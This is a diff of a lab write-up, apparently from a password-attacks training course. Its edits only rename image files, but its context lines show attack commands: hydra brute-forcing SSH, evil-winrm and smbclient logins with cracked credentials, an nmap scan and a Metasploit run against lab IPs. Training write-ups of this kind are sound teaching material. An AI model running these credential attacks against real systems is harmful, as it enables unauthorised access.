@@ -67,13 +67,13 @@ Find the user for the **WinRM** service and crack their password. Then, when you
 
 `evil-winrm -u john -i 10.129.218.11 -p november`
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Find the user for the **SSH** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
 `hydra -L username.list -P password.list ssh://10.129.238.248`
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 `ssh dennis@10.129.238.248`
 
@@ -804,7 +804,7 @@ passphrase: same as password
 
 `nmap -sVC 10.129.202.221`
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 * SSH, SMB
 
@@ -824,11 +824,11 @@ METASPLOIT
 
 `run`
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `smbclient \\\\10.129.202.221\\SHAREDRIVE -U john`
 
-&#x20;![](<.gitbook/assets/image (2).png>)
+&#x20;![](<.gitbook/assets/image (2) (1).png>)
 
 `smbclient \\10.129.202.221\SHAREDRIVE -U john%123456 -c 'get Docs.zip'`
 
